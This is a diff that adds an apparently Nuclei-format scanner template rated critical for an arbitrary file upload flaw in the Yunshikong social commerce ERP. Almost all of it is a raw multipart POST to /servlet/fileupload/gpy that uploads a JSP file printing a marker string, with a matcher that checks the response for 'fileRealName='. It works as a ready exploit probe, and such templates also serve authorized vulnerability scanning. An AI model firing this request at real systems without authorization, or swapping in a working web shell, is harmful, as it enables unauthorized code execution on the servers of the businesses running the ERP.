@@ -1,0 +1,35 @@
+id: yunshikongERP-gpy-upload
+info:
+  name: yunshikongERP-gpy-upload
+  author: apple
+  severity: critical
+  description: 云时空社会化商业ERP任意文件上传
+  reference:
+    - https://github.com/wy876/POC/blob/main/云时空社会化商业ERP任意文件上传.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /servlet/fileupload/gpy HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
+        Content-Length: 220
+
+        --4eea98d02AEa93f60ea08dE3C18A1388
+        Content-Disposition: form-data; name="file"; filename="test123456.jsp"
+        Content-Type: application/octet-stream
+
+        <% out.println("random_str"); %>
+        --4eea98d02AEa93f60ea08dE3C18A1388--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'fileRealName='
